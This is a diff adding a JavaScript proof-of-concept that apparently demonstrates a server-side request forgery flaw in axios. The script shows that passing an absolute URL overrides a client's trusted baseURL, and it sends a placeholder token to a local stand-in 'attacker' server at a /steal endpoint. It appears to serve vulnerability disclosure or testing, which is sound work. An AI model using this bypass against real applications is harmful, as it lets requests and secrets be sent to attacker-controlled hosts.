@@ -1,0 +1,36 @@
+```javascript
+const http = require("http");
+const axios = require("./node_modules/axios");
+
+// Simulates an attacker-controlled server that should be UNREACHABLE
+// because the application restricts all requests to a trusted baseURL.
+const attackerServer = http.createServer((req, res) => {
+  console.log("[!] SSRF SUCCESS: attacker server received request:", req.url);
+  res.end("stolen");
+});
+
+attackerServer.listen(0, "127.0.0.1", async () => {
+  const port = attackerServer.address().port;
+  const attackerURL = `http://127.0.0.1:${port}/steal?token=SECRET`;
+
+  // The application believes every request is confined to this trusted origin.
+  const client = axios.create({
+    baseURL: "https://internal-safe-host.example",
+    proxy: false,
+  });
+
+  try {
+    // Attacker supplies a full absolute URL instead of a relative path.
+    // axios's buildFullPath()/isAbsoluteURL() sink (lib/core/buildFullPath.js)
+    // treats any absolute URL as already "full" and silently bypasses the
+    // configured baseURL restriction, sending the request wherever the
+    // attacker wants (SSRF / baseURL bypass).
+    const r = await client.get(attackerURL);
+    console.log("response:", r.status, r.data);
+  } catch (e) {
+    console.log("request error:", e.message);
+  } finally {
+    attackerServer.close();
+  }
+});
+```
